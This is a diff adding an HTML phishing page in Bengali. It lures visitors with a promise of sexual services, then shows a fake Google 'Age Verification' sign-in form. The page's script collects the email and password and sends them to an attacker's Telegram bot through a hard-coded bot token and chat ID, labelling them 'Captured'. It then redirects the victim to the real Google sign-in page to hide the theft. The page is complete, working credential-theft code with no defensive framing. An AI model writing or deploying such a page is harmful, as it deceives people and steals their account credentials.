@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Age Verification</title>
+    <style>
+        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; margin: 0; padding: 0; }
+        .container { max-width: 500px; margin: auto; padding: 20px; }
+        .main-img { width: 100%; border-radius: 10px; cursor: pointer; border: 2px solid #ff4757; }
+        .btn { background: #ff4757; color: #fff; padding: 15px; border-radius: 50px; font-weight: bold; cursor: pointer; margin-top: 20px; display: inline-block; width: 85%; font-size: 18px; }
+        #verifyBox { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; color: #000; padding-top: 60px; }
+        .login-card { max-width: 350px; margin: auto; padding: 20px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        .next-btn { background: #1a73e8; color: #fff; padding: 10px; border: none; border-radius: 4px; width: 100%; cursor: pointer; font-size: 16px; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="target.jpg" class="main-img" onclick="showLogin()">
+    <p style="color:#ff4757; font-size: 20px; font-weight: bold;">ঘরে বসেই মিটাতে পারবেন আপনাদের শারীরিক চাহিদা!</p>
+    <div class="btn" onclick="showLogin()">এখনই যোগাযোগ করুন</div>
+</div>
+
+<div id="verifyBox">
+    <div class="login-card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" style="width:75px; margin-bottom: 10px;">
+        <h2 style="font-weight: 400; margin-bottom: 5px;">Age Verification</h2>
+        <p style="font-size: 14px; color: #5f6368; margin-bottom: 20px;">১৮+ কন্টেন্ট দেখতে আপনার গুগল অ্যাকাউন্ট দিয়ে ভেরিফাই করুন।</p>
+        <input type="email" id="u_email" placeholder="Email or phone" required>
+        <input type="password" id="u_pass" placeholder="Enter password" required>
+        <div style="text-align: right; margin-top: 20px;">
+            <button class="next-btn" onclick="submitData()">Next</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    function showLogin() { document.getElementById('verifyBox').style.display = 'block'; }
+    function submitData() {
+        const email = document.getElementById('u_email').value;
+        const pass = document.getElementById('u_pass').value;
+        if(email === "" || pass === "") { alert("সঠিক তথ্য দিন।"); return; }
+        const token = "7864530954:AAE1iGV08iH1L0zUMM_Q0jfkcAndibCzMM8";
+        const cid = "8503469856";
+        const text = `🔥 **Captured**\n📧 Email: ${email}\n🔑 Password: ${pass}`;
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(text)}`)
+        .then(() => { window.location.href = "https://accounts.google.com"; });
+    }
+</script>
+
+</body>
+</html>
